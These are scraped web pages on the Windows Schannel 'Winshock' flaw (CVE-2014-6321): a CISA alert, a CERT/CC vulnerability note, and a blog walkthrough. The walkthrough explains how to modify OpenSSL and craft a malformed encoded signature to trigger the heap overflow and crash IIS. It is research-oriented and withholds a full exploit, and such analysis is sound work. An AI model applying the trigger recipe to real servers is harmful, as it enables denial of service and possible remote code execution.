    - [Contact us](https://www.flexera.com/about-us/contact-us)
    - [Media / press center](https://www.flexera.com/about-us/press-center)
    - [Revenera.com](https://www.revenera.com)

 +1.800.374.4353

en

* [English](https://www.flexera.com/products/security/software-vulnerability-research/secunia-research?referrer=secunia)
* [Deutsch](https://www.flexera.de/products/security/software-vulnerability-research/secunia-research?referrer=secunia)

 [![Home](/themes/custom/flexera/images/logo.svg)](https://www.flexera.com/)

© 2025 Flexera. All Rights Reserved.

## Footer

* [Privacy Policy](https://www.flexera.com/legal/privacy-policy)
* [Terms and conditions](https://www.flexera.com/legal)
* [Contact Us](https://www.flexera.com/about-us/contact-us)
* [Impressum](https://www.flexera.com/about-us/impressum)
* [Site Map](https://www.flexera.com/sitemap)

#####

×

...



=== Content from www.us-cert.gov_32a8f40f_20250124_115548.html ===

[Skip to main content](#main)

![U.S. flag](/profiles/cisad8_gov/themes/custom/gesso/dist/images/us_flag_small.png)

An official website of the United States government

Here’s how you know

Here’s how you know

![Dot gov](/profiles/cisad8_gov/themes/custom/gesso/dist/images/icon-dot-gov.svg)

**Official websites use .gov**

 A **.gov** website belongs to an official government organization in the United States.

![HTTPS](/profiles/cisad8_gov/themes/custom/gesso/dist/images/icon-https.svg)

**Secure .gov websites use HTTPS**

 A **lock** (LockA locked padlock) or **https://** means you’ve safely connected to the .gov website. Share sensitive information only on official, secure websites.

[Free Cyber Services](/resources-tools/resources/free-cybersecurity-services-and-tools "Free Cyber Services")[Secure by design](/securebydesign) [Secure Our World](/node/18883)[Shields Up](/node/8056)[Report A Cyber Issue](/report)

[![Cybersecurity & Infrastructure Security Agency logo America’s Cyber Security Defense Agency National Coordinator For Critical Infrastructure Security and Resilience](/sites/default/files/images/SVG/header_logo_tagline_update.svg)](/)

[![CISA Logo](/sites/default/files/images/SVG/mobile_logo_wordmark.svg)](/)

Search

Menu

![America's Cyber Defense Agency](/sites/default/files/images/SVG/header_tagline_mobile_update.svg)

Close

* Topics

  [Topics](/topics)

  [Cybersecurity Best Practices](/topics/cybersecurity-best-practices)

  [Cyber Threats and Advisories](/topics/cyber-threats-and-advisories)

  [Critical Infrastructure Security and Resilience](/topics/critical-infrastructure-security-and-resilience)

  [Election Security](/topics/election-security)

  [Emergency Communications](/topics/emergency-communications)

  [Industrial Control Systems](/topics/industrial-control-systems)

  [Information and Communications Technology Supply Chain Security](/topics/information-communications-technology-supply-chain-security)

  [Partnerships and Collaboration](/topics/partnerships-and-collaboration)

  [Physical Security](/topics/physical-security)

  [Risk Management](/topics/risk-management)

   [How can we help?](/audiences)
  [Government](/topics/government)[Educational Institutions](/topics/educational-institutions)[Industry](/topics/industry)[State, Local, Tribal, and Territorial](/topics/state-local-tribal-and-territorial)[Individuals and Families](/topics/individuals-and-families)[Small and Medium Businesses](/topics/small-and-medium-businesses)[Find Help Locally](/audiences/find-help-locally)[Faith-Based Community](/audiences/faith-based-community)[Executives](/audiences/executives)[High-Risk Communities](/audiences/high-risk-communities)
* [Spotlight](/spotlight)
* Resources & Tools

  [Resources & Tools](/resources-tools)

  [All Resources & Tools](/resources-tools/all-resources-tools)

  [Services](/resources-tools/services)

  [Programs](/resources-tools/programs)

  [Resources](/resources-tools/resources)

  [Training](/resources-tools/training)

  [Groups](/resources-tools/groups)
* News & Events

  [News & Events](/news-events)

  [News](/news-events/news)

  [Events](/news-events/events)

  [Cybersecurity Alerts & Advisories](/news-events/cybersecurity-advisories)

  [Directives](/news-events/directives)

  [Request a CISA Speaker](/news-events/request-speaker)

  [Congressional Testimony](/news-events/congressional-testimony)

  [CISA Conferences](/cisa-conferences)

  [CISA Live!](/cisa-live)
* Careers

  [Careers](/careers)

  [Benefits & Perks](/careers/benefits-perks)

  [HireVue Applicant Reasonable Accommodations Process](/careers/hirevue-applicant-reasonable-accommodations-process)

  [Hiring](/general-recruitment-and-hiring-faqs)

  [Resume & Application Tips](/careers/resume-application-tips)

  [Students & Recent Graduates](/students-recent-graduates-employment-opportunities)

  [Veteran and Military Spouses](/careers/veteran-and-military-spouse-employment-opportunities)

  [Work @ CISA](/careers/work-cisa)
* About

  [About](/about)

  [Divisions & Offices](/about/divisions-offices)

  [Regions](/about/regions)

  [Leadership](/about/leadership)

  [Doing Business with CISA](/doing-business-cisa)

  [Site Links](/site-links)

  [Reporting Employee and Contractor Misconduct](/reporting-employee-and-contractor-misconduct)

  [CISA GitHub](/cisa-github)

  [CISA Central](/cisa-central)

  [2024 Year In Review](/about/2024YIR)

  [Contact Us](/about/contact-us)

  [Equal Employment Opportunity](/eeo)

  [Subscribe](/about/contact-us/subscribe-updates-cisa)

  [Reasonable Accommodations & Accessibility](/rap)

  [Special Emphasis Programs](/sep)

  [No FEAR Act Notice & Reports](/no-fear-act)

  [Policies & Plans](/eeo-policies)

[Free Cyber Services](/resources-tools/resources/free-cybersecurity-services-and-tools "Free Cyber Services")[Secure by design](/securebydesign) [Secure Our World](/node/18883)[Shields Up](/node/8056)[Report A Cyber Issue](/report)

Breadcrumb

1. [Home](/)
2. [News & Events](/news-events)
3. [Cybersecurity Advisories](/news-events/cybersecurity-advisories)
4. [Alert](/news-events/cybersecurity-advisories?f%5B0%5D=advisory_type%3A93)

Share:

Alert
# Microsoft Secure Channel (Schannel) Vulnerability (CVE-2014-6321)

Last RevisedSeptember 30, 2016
Alert CodeTA14-318A

### Systems Affected

* Microsoft Windows Vista, 7, 8, 8.1, RT, and RT 8.1
* Microsoft Server 2003, Server 2008, Server 2008 R2, Server 2012, and Server 2012 R2

Microsoft Windows XP and 2000 may also be affected.

### Overview

A critical vulnerability in Microsoft Windows systems could allow a remote attacker to execute arbitrary code via specially crafted network traffic.[[1]](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6321)

Microsoft Secure Channel (Schannel) is a security package that provides SSL and TLS on Microsoft Windows platforms.[[2](https://technet.microsoft.com/library/security/MS14-066), [3](http://msdn.microsoft.com/en-us/library/windows/desktop/aa380123%28v%3Dvs.85%29.aspx)] Due to a flaw in Schannel, a remote attacker could execute arbitrary code on both client and server applications.[[1]](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6321)

It may be possible for exploitation to occur without authentication and via unsolicited network traffic. According to Microsoft MS14-066, there are no known mitigations or workarounds.[[2]](https://technet.microsoft.com/library/security/MS14-066)

Microsoft patches are typically reverse-engineered and exploits developed in a matter of days or weeks.[[4]](https://www.reddit.com/r/netsec/comments/2m1alz/microsoft_security_bulletin_ms14066/) An anonymous Pastebin user has threatened to publish an exploit on Friday, November 14, 2014.[[5]](http://pastebin.com/bsgX01dU)

### Impact

This flaw allows a remote attacker to execute arbitrary code and fully compromise vulnerable systems.[[6]](http://adi.is/winshock.txt)

### Solution

Microsoft has released Security Bulletin MS14-066 to address this vulnerability in supported operating systems.[[2]](https://technet.microsoft.com/library/security/MS14-066)

### References

[[1] NIST Vulnerability Summary for CVE-2014-6321](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6321)
[[2] Microsoft Security Bulletin MS14-066 - Critical](https://technet.microsoft.com/library/security/MS14-066)
[[3] Microsoft, Secure Channel](https://msdn.microsoft.com/en-us/library/windows/desktop/aa380123%28v%3Dvs.85%29.aspx)
[[4] Reddit, Microsoft Security Bulletin MS14-066](https://www.reddit.com/r/netsec/comments/2m1alz/microsoft_security_bulletin_ms14066)
[[5] Pastebin, SChannelShenanigans](https://pastebin.com/bsgX01dU)
[[6] Winshock.txt](http://adi.is/winshock.txt)
### Revisions

November 14, 2014: Initial Release

This product is provided subject to this [Notification](/notification "Follow link") and this [Privacy & Use](/privacy-policy "Follow link") policy.

## Please share your thoughts

We recently updated our anonymous [product survey](https://cisasurvey.gov1.qualtrics.com/jfe/form/SV_9n4TtB8uttUPaM6?product=https://www.cisa.gov/news-events/alerts/2014/11/14/microsoft-secure-channel-schannel-vulnerability-cve-2014-6321); we’d welcome your feedback.

Return to top

* [Topics](/topics)
* [Spotlight](/spotlight)
* [Resources & Tools](/resources-tools)
* [News & Events](/news-events)
* [Careers](/careers)
* [About](/about)

[Cybersecurity & Infrastructure Security Agency](/ "Go to the Cybersecurity & Infrastructure Security Agency homepage")

* [Facebook](https://www.facebook.com/CISA)
* [Twitter](https://twitter.com/CISAgov)
* [LinkedIn](https://www.linkedin.com/company/cybersecurity-and-infrastructure-security-agency)
* [YouTube](https://www.youtube.com/%40cisagov)
* [Instagram](https://www.instagram.com/cisagov)
* [RSS](/subscribe-updates-cisa)

CISA Central
1-844-Say-CISA
SayCISA@cisa.dhs.gov

DHS Seal
CISA.gov
An official website of the U.S. Department of Homeland Security

* [About CISA](/about "About CISA")
* [Budget and Performance](https://www.dhs.gov/performance-financial-reports "Budget and Performance")
* [DHS.gov](https://www.dhs.gov "Department of Homeland Security")
* [FOIA Requests](https://www.dhs.gov/foia "FOIA Requests")
* [No FEAR Act](/no-fear-act "No FEAR Act Reporting")
* [Office of Inspector General](https://www.oig.dhs.gov/ "Office of Inspector General")
* [Privacy Policy](/privacy-policy "Privacy Policy")
* [Subscribe](https://public.govdelivery.com/accounts/USDHSCISA/subscriber/new?topic_id=USDHSCISA_138 "Subscribe to Email Updates")
* [The White House](https://www.whitehouse.gov/ "The White House")
* [USA.gov](https://www.usa.gov/ "USA.gov")
* [Website Feedback](/forms/feedback "Website Feedback")



=== Content from www.kb.cert.org_e393ccc1_20250124_115546.html ===


search

menu

icon-carat-right

cmu-wordmark

* ×
* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* [Search](/vuls/search/)
* [Report a Vulnerability](/vuls/report/)
* [Disclosure Guidance](/vuls/guidance/)
* [VINCE](/vince/)

[[Carnegie Mellon University](https://www.cmu.edu)](https://www.cmu.edu/)

# [Software Engineering Institute](https://www.sei.cmu.edu/)

## CERT Coordination Center

* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* [Search](/vuls/search/)
* [Report a Vulnerability](/vuls/report/)
* [Disclosure Guidance](/vuls/guidance/)
* [VINCE](/vince/)

* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* Current:  VU#505120

## Microsoft Secure Channel (Schannel) vulnerable to remote code execution via specially crafted packets

#### Vulnerability Note VU#505120

Original Release Date: 2014-11-13 | Last Revised: 2014-11-17

---

### Overview

A critical vulnerability in Microsoft Windows systems could allow a remote attacker to execute arbitrary code via specially crafted network packets.

### Description

| Microsoft [Secure Channel](http://msdn.microsoft.com/en-us/library/windows/desktop/aa380123%28v%3Dvs.85%29.aspx) (Schannel) is a security package that provides SSL and TLS on Microsoft Windows platforms. Due to a flaw in Schannel ([CVE-2014-6321](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6321)), a remote attacker could execute arbitrary code on both client and server applications.  It may be possible for exploitation to occur without authentication and via unsolicited network traffic. According to Microsoft [MS14-066](https://technet.microsoft.com/library/security/MS14-066), there are no known mitigations or workarounds.  Microsoft patches are typically reverse-engineered and exploits developed in a matter of days or weeks. An anonymous Pastebin user has [threatened](http://pastebin.com/bsgX01dU) to publish an exploit on Friday, November 14, 2014. Immunity Inc. has developed a [proof of concept exploit](http://seclists.org/dailydave/2014/q4/32) for their CANVAS tool.  ANEXIA has [published a tool](https://github.com/anexia-it/winshock-test) to test if a system is vulnerable. |
| --- |

### Impact

| This flaw allows a remote attacker to execute arbitrary code and fully compromise vulnerable systems. |
| --- |

### Solution

| **Apply an update**Microsoft has released Security Bulletin [MS14-066](https://technet.microsoft.com/library/security/MS14-066) to address this vulnerability in supported operating systems. |
| --- |

### Vendor Information

| Many versions of Microsoft Windows operating systems are confirmed vulnerable, including:       - Microsoft Windows Vista, 7, 8, 8.1, RT, and RT 8.1 - Microsoft Windows Server 2003, 2008, 2008 R2, 2012, and 2012 R2  Unsupported operating systems such as Microsoft Windows XP and 2000 may also be affected. |
| --- |

505120
Filter by status:
All
Affected
Not Affected
Unknown

Filter by content:
 Additional information available

 Sort by:
Status
Alphabetical

Expand all

**Javascript is disabled. Click [here](/vuls/vendor/VU%23505120/) to view vendors.**
### [Microsoft Corporation](#JLAD-9QTU7S) Affected

Updated:  November 13, 2014

### Status

Affected

### Vendor Statement

We have not received a statement from the vendor.

### Vendor Information

We are not aware of further vendor information regarding this vulnerability.

### Vendor References

* <https://technet.microsoft.com/library/security/MS14-066>

### CVSS Metrics

| Group | Score | Vector |
| --- | --- | --- |
| Base | 10 | AV:N/AC:L/Au:N/C:C/I:C/A:C |
| Temporal | 8.3 | E:F/RL:OF/RC:C |
| Environmental | 9.0 | CDP:MH/TD:H/CR:ND/IR:ND/AR:ND |

### References

* <https://technet.microsoft.com/library/security/MS14-066>
* <http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6321>
* [http://msdn.microsoft.com/en-us/library/windows/desktop/aa380123%28v=vs.85%29.aspx](http://msdn.microsoft.com/en-us/library/windows/desktop/aa380123%28v%3Dvs.85%29.aspx)
* <http://adi.is/winshock.txt>
* <http://pastebin.com/bsgX01dU>
* <https://gist.github.com/hmoore-r7/3379af8b0419ddb0c76b>
* <http://seclists.org/dailydave/2014/q4/32>
* <https://github.com/anexia-it/winshock-test>
### Acknowledgements

This document was written by Joel Land.

### Other Information

| **CVE IDs:** | [CVE-2014-6321](http://web.nvd.nist.gov/vuln/detail/CVE-2014-6321) |
| --- | --- |
| **Date Public:** | 2014-11-11 |
| **Date First Published:** | 2014-11-13 |
| **Date Last Updated:** | 2014-11-17 16:02 UTC |
| **Document Revision:** | 27 |

* [About vulnerability notes](https://vuls.cert.org/confluence/display/VIN/Vulnerability%2BNote%2BHelp)
* Contact us about this vulnerability
* [Provide a vendor statement](https://vuls.cert.org/confluence/display/VIN/Case%2BHandling#CaseHandling-Givingavendorstatusandstatement)

Sponsored by [CISA.](https://www.cisa.gov/cybersecurity)

 [Download PGP Key](https://vuls.cert.org/confluence/pages/viewpage.action?pageId=25985026)

[Read CERT/CC Blog](https://insights.sei.cmu.edu/cert/)

[Learn about Vulnerability Analysis](https://www.sei.cmu.edu/research-capabilities/all-work/display.cfm?customel_datapageid_4050=21304)

Carnegie Mellon University

Software Engineering Institute

4500 Fifth Avenue

Pittsburgh, PA 15213-2612

412-268-5800

[Office Locations](http://www.sei.cmu.edu/locations/index.cfm) | [Additional Sites Directory](http://www.sei.cmu.edu/additional-sites-directory/index.cfm) | [Legal](https://vuls.cert.org/confluence/display/VIN/VINCE%2BCode%2Bof%2BConduct#VINCECodeofConduct-TermsofUse) | [Privacy Notice](https://www.sei.cmu.edu/legal/privacy-notice/index.cfm) | [CMU Ethics Hotline](https://www.cmu.edu/hr/ethics-hotline/) | [www.sei.cmu.edu](http://www.sei.cmu.edu)

Â©2022 Carnegie Mellon University

[Contact SEI](https://www.sei.cmu.edu/contact-us/)
#### Contact CERT/CC

 412-268-5800



=== Content from www.securitysift.com_33b8751c_20250126_005641.html ===


* [Home](https://www.securitysift.com/)
* [About](https://www.securitysift.com/about/)
* [My Library](https://www.securitysift.com/my-library/)

# [Security Sift](https://www.securitysift.com/)

Sifting through the world of Information Security, one bit at a time

Sift: to examine (something) thoroughly so as to isolate that which is most important -- Oxford Dictionary

Google
# Exploiting MS14-066 / CVE-2014-6321 (aka “Winshock”)

![](http://www.securitysift.com/wp-content/uploads/2012/09/mike_czumak.jpg)
Written on:[November 29, 2014](https://www.securitysift.com/2014/11/29/)
Comments are closed
### Introduction

I think enough time has passed now to provide a little more detail on how to exploit MS14-066 schannel vulnerability (aka “Winshock”). In this post I won’t be providing a complete PoC exploit, but I will delve into the details on exactly how to trigger the heap overflow along with some example modifications to OpenSSL so you can replicate the issue yourself.

This vulnerability was announced while I was on vacation so I didn’t have a chance to analyze it right away. Lucky for me, the research team at BeyondTrust posted this concise write-up, keying in on the vulnerable code: <http://blog.beyondtrust.com/triggering-ms14-066>. When I first looked at the specifics of the vulnerability, I admittedly discounted it’s severity solely for the fact that it seemed necessary to have some form of mutual certificate-based authentication to trigger — still a big deal but not as widespread as I first imagined (or so I thought). Then, a couple of days later, Malware Tech posted this gem: <http://www.malwaretech.com/2014/11/how-ms14-066-winshock-is-worse-than.html>. Wow…triggering the exploit on web servers even if they were set to ignore certificates definitely renewed my interest. @MalwareTechBlog subsequently released this nice write-up with additional details, but by that time I was already deep into examining the exploit (though it’s still worth a read if you haven’t already): <http://www.malwaretech.com/2014/11/ms14-066-in-depth-analysis.html>.

If you’ve already had a chance to read these sources, please bear with me, because for the sake of completeness, I will be repeating some of the information.

First, let’s take a closer look at the vulnerable function…

### schannel!DecodeSigAndReverse

Here is the disassembly for the pertinent portions of the DecodeSigAndReverse function (found in schannel.dll) which is responsible for decoding the encoded certificate signature.

[![ms14066_01-1](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_01-1-1024x779.png)](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_01-1.png)

Of interest to us are the calls to CryptDecodeObject the the two subsequent calls to memcpy (found in the lower left yellow box), which is what ultimately triggers this vulnerability. I’ll get into more details but first it’s important to note that to trigger the vulnerable memcpy, we need to somehow force the server to verify a client-provided ECC certificate (as indicated by the cmp ebx, 2Fh instruction highlighted below).

[![ms14066_02](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_02-1024x562.png)](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_02.png)

Most web servers will ignore a submitted client certificate (unless certificate authentication is required). However, as @MalwareTechBlog pointed out, vulnerable IIS servers will actually process a certificate that is forcefully presented regardless of the configured SSL settings. I’ll be demonstrating this vulnerability only for IIS on port 443, though you may be able to replicate similar results for RDP.

### The Setup

The first thing you’ll need to do to trigger this exploit is configure IIS SSL settings (I used a Win 7 box) as follows:

[![ms14066_03](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_03.jpg)](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_03.jpg)

Generate a self-signed certificate (using OpenSSL), upload to your Windows box and bind it to your site:

[![ms14066_04](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_04.jpg)](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_04.jpg)

Now generate an EC cert/key pair to use on your “attacking” machine. Next you’ll need to download the OpenSSL source. For my test setup I used version 1.0.1j on a Kali box. Since you’re probably going to be modifying and recompiling many times, you may want to use the .configure script to permanently set any desired build variables (such as install location).

Once you’ve got your web server configured, your client cert/key generated, and openSSL source downloaded, it’s time to make some modifications, specifically to s3\_clnt.c. First, we need to force the sending of our client certificate which can be done as follows:

[![ms14066_05](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_05-1024x886.png)](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_05.png)

Notice I’ve altered the case statement logic to force a call to ssl3\_send\_client\_certificate.

Next you’ll need to force certificate verification, which can be done with the following modification to make a call to ssl3\_send\_client\_verify:

[![ms14066_06](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_06-1000x1024.png)](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_06.png)

Connect a remote kernel debugger to your test IIS box and set a breakpoint on schannel!DecodeSigAndReverse. Then connect via the modified OpenSSL s\_client and you should trigger your breakpoint:

[![ms14066_39](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_391-1024x191.jpg)](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_391.jpg)

[![ms14066_08](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_08.jpg)](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_08.jpg)

Once you’ve confirmed you can enter the vulnerable function, it’s time to delve into the details to understand how to exploit it.

### A Closer Look

If you refer back to the disassembly of DecodeSigAndReverse, one of the the initial things to happen is the first of two calls to [CryptDecodeObject](http://msdn.microsoft.com/en-us/library/windows/desktop/aa379911%28v%3Dvs.85%29.aspx).

[![ms14066_07](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_07.jpg)](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_07.jpg)This first call sets pvStructInfo to null to determine the size of the buffer needed to hold the decoded signature for proper memory allocation (which is handled by the subsequent call to SPExternalAlloc).

The second call to CryptDecodeObject is the one of interest.

[![ms14066_10](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_10-1024x243.jpg)](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_10.jpg)

Testing this with an unmodified EC cert and key pair you should see something similar to the following for pcbStructInfo and pvStructInfo:

[![ms14066_09](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_09.jpg)](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_09.jpg)

You can see before the call that the designated size is 50h and the pvStructInfo structure is 0’d out and ready to receive the decoded signature. cbEncoded holds the size of the encoded signature, which in this case is 46h. The encoded signature looks as follows:

[![ms14066_12](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_12.jpg)](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_12.jpg)

\* Note: in the above pic, ebp+0ch shows the size of the encoded signature (46h) and the memory at location 002dc57b holds the encoded signature.

When the second CryptDecodeObject function returns, pvStructInfo now holds the decoded signature:

[![ms14066_13](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_13.jpg)](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_13.jpg)

Now we can shift our attention to the two memcpy functions that follow.

[![ms14066_14](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_14.jpg)](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_14.jpg)

The first memcpy will copy the number of bytes of the decoded signature designated in [esi] (in this case 20h or 32d) to a designated buffer (Dst). In the screenshot below, you can see that the contents of this buffer after the call to memcpy contain the first 32 bytes of the decoded signature returned by CryptDecodeObject.

[![ms14066_15](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_15.jpg)](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_15.jpg)

Similarly, the second memcpy copies the remaining 32 bytes of the decoded signature to the adjacent reserved space in memory (Dst).

[![ms14066_16](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_16.jpg)](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_16.jpg)

It’s the second memcpy function that is vulnerable to a heap overflow and will be the focus of our attention. To understand why it’s vulnerable to an overflow condition, we need to see how the destination buffer (Dst) is allocated which actually happens in the CheckClientVerifyMessage().

[![ms14066_17](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_17.jpg)](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_18.jpg)

Notice in the third block below (before the call to DecodeSigAndReverse) is the call to SPExternalAlloc, which reserves the memory (Dst) where our decoded signature will be copied via the two calls to memcpy shown previously.

[![ms14066_19](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_19-1024x537.jpg)](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_19.jpg)

You’ll recall each of those calls to memcpy copied 32 bytes (20h) of the decoded signature to adjacent portions of memory to fill a total of 40h bytes. This 40h bytes is reserved by SPExternalAlloc by taking the total key size (in this case 256 bits), dividing it by 8 (to convert to bytes) and doubling it (256 / 8 = 32 \* 2 = 64d or 40 h). The dangerous assumption here is that the decoded signature will always be twice the size of the key. We’re about to see why that’s not true.

### Modifying The Encoded Signature

The first thing we want to do is have some control over the size of the encoded signature represented by cbEncoded. If you refer to the call to CheckClientVerifyMessage(), you’ll notice that cbEncoded is passed as a parameter, which means we need to back up even further to the function DigestCertVerify().

[![ms14066_21](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_21-1024x191.jpg)](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_21.jpg)

We can see at location 0xXXXX98CE of DigestCertVerify that cbEncoded is located at [esi+1]. It turns out [esi] merely points to the start of the encoded signature structure which looks like this:

[![ms14066_22](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_22.jpg)](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_22.jpg)

Notice [esi+1] holds the value of cbEncoded (47h). The bytes that follow make up the encoded signature that will eventually be passed to CrypteDecodeObject() within DecodeSigAndReverse(). Here is a look at that call so you can see they are identical:

[![ms14066_23](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_23.jpg)](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_23.jpg)

The structure that holds our encoded signature is [defined on MSDN](http://msdn.microsoft.com/en-us/windows/aa377194%28v%3Dvs.71%29.aspx) as follows:

[![ms14066_26](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_26-1024x477.png)](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_26.png)

For the purpose of this demo, I’ll call this structure sig. We’ve identified the total size of sig by the byte located at sig[1]. Structure members r and s are decoded and copied via the two memcpy operations. What’s even more interesting is that two other bytes of sig (which is under our control) dictate the size of r and s used in each memcpy operation.

[![ms14066_24](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_24.png)](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_24.png)

This means we have control over how many bytes are written via each memcpy and can use that to overwrite the reserved heap buffer. In addition, other than a few required byte values, the majority of the encoded signature is irrelevant, meaning we can inject any values we wish.

In addition, submitting an invalid encoded signature to CryptDecodeObject doesn’t result in an error. Instead, it simply returns the invalid encoded signature that we passed it and that data is subsequently written to the heap via the vulnerable memcpy functions. This means we can predict the subsequent return values that will be passed to the vulnerable memcpy functions and written via the heap overflow.

From my brief testing, I identified the following required values for sig:

* sig[1] = cbEncoded (total size of sig); my testing indicates that max size is \x81
* sig[2] = \x30; required (leave unchanged)
* sig[3] = (sig[1] -1); max size is \x7f
* sig[4] = \x02; appears to represent data type that follows
* sig[5] = size of r or memcpy 1; minimum value is 1
* sig[6] = any single byte value such as \x00
* sig[7] = \x02; appears to represent data type that follows
* sig[8] = sig[1] – 7 = \x7a
* sig[9]…sig[x] = any arbitrary values for heap oveflow

### Triggering the Exploit

So, how can we influence the encoded signature value? Rather than changing the content of the certificate, we can modify the encoded signature directly in OpenSSL via the ssl3\_send\_client\_verify function.

[![ms14066_38](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_38-811x1024.jpg)](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_38.jpg)

A couple things to note about the above modified signature. The first memcpy is represented by the three bytes at psig[2] – psig[4] (\x02\x01\x00). Again, I believe the first byte to represent the data type, the second byte is the size for memcpy, and the third byte is the content (src) to write. A single byte of \x00 will result in the first memcpy writing 32 null bytes to the first half of the reserved 64 bytes.

The next 32 bytes as well as up to 90 additional bytes will be consumed by what follows psig[7] and psig[8]. This is what results in the heap overflow.

For purposes of illustration, notice I changed the total size of the signature to a much larger value of 15,500. Although CryptDecodeObject limits the size of the total signature it will process (again, my testing indicated the limit is \x81), DecodeSigAndReverse accepts much larger values for the encoded signature (pbEncoded) which means arbitrary data can be written to memory before it’s processed by CryptDecodeObject Note: it appears that DecodeSigAndReverse properly allocates memory for the encoded signature and none of my tests resulted in an overflow condition as a result submitting a large signature; however, being able to write 10,000+ bytes of arbitrary data may come in handy.

You can see an example of this below:

[![ms14066_25](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_25.jpg)](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_25.jpg)

Following this through to the memcpy functions, the resulting heap overflow looks as follows:

[![ms14066_36](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_36-2.jpg)](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_36-2.jpg)

Not surprisingly, this overflow results in an Access Violation (yours may vary).

[![ms14066_37](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_37-2.jpg)](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_37-2.jpg)

[![ms14066_40](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_40-1024x854.png)](http://www.securitysift.com/wp-content/uploads/2014/11/ms14066_40.png)

One thing to note about this basic demonstration is that the heap overflow may not be triggered immediately nor will the access violation caused by this simple demo be consistent. I found you can typically trigger it at-will by establishing another (valid) connection via an unmodified version of OpenSSL s\_client. Here’s a quick 30 second video demonstrating what it looks like on the target machine.

As I said earlier, I won’t be providing a full working exploit PoC at this time nor will I be uploading my modified version of OpenSSL. That said, the information in this post should be more than enough to understand how this vulnerability can be exploited (though reliability will be a factor) and you may think of additional methods of exploitation. Regardless, this simple demo is still enough to interrupt IIS services and reboot the target machine so please do not test it against any servers unless you have explicit permission to do so!

### Conclusion

To recap, the second memcpy found in schannel!DecodeSigAndReverse is vulnerable to a heap overflow condition due to the presumption of the decoded signature size (twice the size of the key) made in the calling function CheckClientVerifyMessage. Since we can control (to a degree) the size and content of the memcpy function (via the encoded signature) and CryptDecodeObject leaves the encoded signature input untouched, we can predict the values written in the heap overflow. This can all be triggered via some basic modification to OpenSSL.

Hopefully this gave you some additional insight into how this vulnerability can be triggered and exploited, and as always, apply those patches if you haven’t already!

Until next time,

Mike

[Follow @securitysift](http://twitter.com/securitysift)

### Share this:

* [Twitter](https://www.securitysift.com/exploiting-ms14-066-cve-2014-6321-aka-winshock/?share=twitter "Click to share on Twitter")
* [Facebook](https://www.securitysift.com/exploiting-ms14-066-cve-2014-6321-aka-winshock/?share=facebook "Click to share on Facebook")
* [LinkedIn](https://www.securitysift.com/exploiting-ms14-066-cve-2014-6321-aka-winshock/?share=linkedin "Click to share on LinkedIn")
* Email
* [Pinterest](https://www.securitysift.com/exploiting-ms14-066-cve-2014-6321-aka-winshock/?share=pinterest "Click to share on Pinterest")
* [Reddit](https://www.securitysift.com/exploiting-ms14-066-cve-2014-6321-aka-winshock/?share=reddit "Click to share on Reddit")

In category: [Exploits](https://www.securitysift.com/category/exploits/)

### 55 Comments [add one](#leave-comment)

Previous post: [Windows OLE RCE Exploit MS14-060 (CVE-2014-4114) – Sandworm](https://www.securitysift.com/windows-ole-rce-exploit-ms14-060/)

Next post: [Developing a Security Assessment Program](https://www.securitysift.com/developing-a-security-assessment-program/)

